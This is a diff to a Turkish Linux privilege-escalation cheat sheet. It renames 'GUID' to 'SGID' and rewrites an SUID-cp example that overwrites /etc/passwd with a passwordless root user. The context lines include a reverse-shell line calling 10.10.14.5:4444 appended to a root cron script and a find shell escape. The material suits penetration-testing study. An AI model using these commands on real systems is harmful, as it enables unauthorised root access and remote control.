@@ -49,13 +49,13 @@ groups
 cat /etc/group
 ```
 
-### SUID / GUID Bitleri
+### SUID / SGID Bitleri
 
 ```bash
 # SUID binary'leri bul
 find / -perm -4000 -type f 2>/dev/null
 
-# GUID binary'leri bul
+# SGID binary'leri bul
 find / -perm -2000 -type f 2>/dev/null
 ```
 
@@ -106,9 +106,12 @@ echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" >> /opt/backup.sh
 # Örnek: /usr/bin/find SUID ise
 find . -exec /bin/sh -p \; -quit
 
-# Örnek: /usr/bin/cp SUID ise — /etc/passwd üzerine yaz
-cp /etc/passwd /tmp/passwd.bak
-echo "hacker::0:0:root:/root:/bin/bash" >> /etc/passwd
+# Örnek: /usr/bin/cp SUID ise — root yetkisiyle /etc/passwd üzerine yaz
+# 1. Yerel kopyaya yeni kullanıcı ekle (/tmp herkes için yazılabilir)
+cp /etc/passwd /tmp/passwd.new
+echo "hacker::0:0:root:/root:/bin/bash" >> /tmp/passwd.new
+# 2. SUID cp ile orijinalin üzerine bas (cp root yetkisiyle yazar)
+cp /tmp/passwd.new /etc/passwd
 su hacker
 ```
 
